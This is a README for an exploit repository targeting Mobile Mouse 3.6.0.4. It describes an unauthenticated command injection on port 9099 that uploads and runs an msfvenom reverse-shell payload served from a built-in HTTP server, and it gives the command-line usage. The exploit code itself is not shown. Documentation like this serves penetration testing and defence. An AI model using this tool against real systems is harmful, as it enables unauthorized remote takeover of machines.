# Mobile Mouse 3.6.0.4 RCE Exploit

Exploit by: [Chokri Hammedi](https://www.exploit-db.com/exploits/51010) (08/22)   
Fixed by: [lof1](https://github.com/lof1sec/mobile_mouse_rce/tree/main) (10/23)  
Updated by: x7331 (05/25)  

## Overview
This repository contains an exploit script targeting Mobile Mouse version 3.6.0.4, a remote control software for mobile devices. The exploit allows remote code execution (RCE) by leveraging an unauthenticated command injection vulnerability in the Mobile Mouse server running on port 9099.

## Original Exploit
The original exploit (dated August 9, 2022) works by uploading a crafted executable payload (usually generated manually via msfvenom) to the target machine's temporary directory and then remotely triggering its execution. The payload is served via an external HTTP server manually started by the attacker.

### What This Exploit Does
1. Connects to the Mobile Mouse service on the target IP (port 9099).
2. Sends crafted commands to upload a malicious payload (reverse shell executable) to the remote host.
3. Executes the uploaded payload, resulting in a reverse shell connection back to the attacker.
4. Requires an HTTP server serving the payload executable externally.

## Improvements
The updated script enhances the original exploit with:

1. **Integrated Payload Generation**: The script can now automatically generate the payload executable using msfvenom internally, removing the need to create the payload manually.
2. Uses a **temporary file to store the generated executable**, which is cleaned up after use.
3. **Built-in HTTP Server**: The script launches a background HTTP server to serve the generated (or user-supplied) payload. This removes the manual step of starting a separate HTTP server.

### Flexible Parameters:
Added command-line arguments to specify:

- `--server-port`: Port number for the HTTP server serving the payload (default: 8080).
- `--payload`: Optional argument to provide a custom payload executable path.
- `--lhost` and `--lport`: Local IP and port for reverse shell callback.
- `--target`: Target IP address.

### Improved Usage & Output:
* Clear console output for each major step.
* Cleaner error handling and feedback.
* Proper cleanup of temporary payload files.

### Usage Help & Defaults:
* If no payload is provided, auto-generation is triggered.
* The script prints helpful usage instructions if arguments are missing.

## How to Use

### Prerequisites
1. Python 3 installed.
2. `msfvenom` installed and available in your system path.
3. Network connectivity to the target Mobile Mouse server on port `9099`.

### Basic Usage
```bash
python3 exploit.py --target <TARGET_IP> --lhost <YOUR_IP> --lport <YOUR_PORT>
```

This will:
1. Automatically generate a reverse shell payload with `msfvenom`.
2. Start a local HTTP server on port 8080 to serve the payload.
3. Upload and execute the payload on the target.

## Disclaimer
This exploit is intended for educational purposes and authorized penetration testing only. Unauthorized use against systems you do not own or have explicit permission to test is illegal and unethical.
